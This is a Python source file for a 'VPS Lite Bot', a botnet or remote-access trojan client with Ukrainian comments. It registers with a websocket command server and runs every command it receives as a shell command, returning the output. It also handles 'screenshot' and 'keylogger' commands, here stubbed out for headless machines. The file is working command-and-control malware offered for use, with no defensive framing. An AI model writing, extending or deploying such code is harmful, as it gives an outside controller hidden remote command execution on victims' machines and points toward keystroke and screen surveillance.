import asyncio
import websockets
import json
import os
import sys

# Спроба імпортувати pynput, але з ігноруванням помилок для VPS
try:
    from pynput import keyboard
    HAS_GUI = True
except Exception:
    HAS_GUI = False

BOT_ID = sys.argv[1] if len(sys.argv) > 1 else "vps-test-bot"
SERVER_URL = "ws://127.0.0.1:8000/ws"

async def run_bot():
    print(f"[*] Starting VPS Lite Bot: {BOT_ID}")
    print(f"[*] Connecting to {SERVER_URL}...")
    
    try:
        async with websockets.connect(SERVER_URL) as websocket:
            # Реєстрація
            await websocket.send(json.dumps({
                "type": "register",
                "bot_id": BOT_ID,
                "platform": "Linux (Headless VPS)"
            }))
            
            print("[+] Connected and registered!")

            while True:
                message = await websocket.recv()
                data = json.loads(message)
                command = data.get("command")
                
                print(f"[*] Received command: {command}")

                if command == "screenshot":
                    response = "Error: Screenshots not available on headless VPS"
                    await websocket.send(json.dumps({"type": "screenshot", "data": response}))
                
                elif command == "keylogger":
                    response = "Error: Keylogger not supported on headless VPS"
                    await websocket.send(json.dumps({"type": "keylogger", "data": response}))
                
                else:
                    # Виконання звичайних консольних команд
                    try:
                        proc = await asyncio.create_subprocess_shell(
                            command,
                            stdout=asyncio.subprocess.PIPE,
                            stderr=asyncio.subprocess.PIPE
                        )
                        stdout, stderr = await proc.communicate()
                        output = stdout.decode() + stderr.decode()
                        await websocket.send(json.dumps({"type": "terminal", "data": output or "Command executed."}))
                    except Exception as e:
                        await websocket.send(json.dumps({"type": "terminal", "data": f"Error: {str(e)}"}))

    except Exception as e:
        print(f"[!] Connection error: {e}")

if __name__ == "__main__":
    asyncio.run(run_bot())
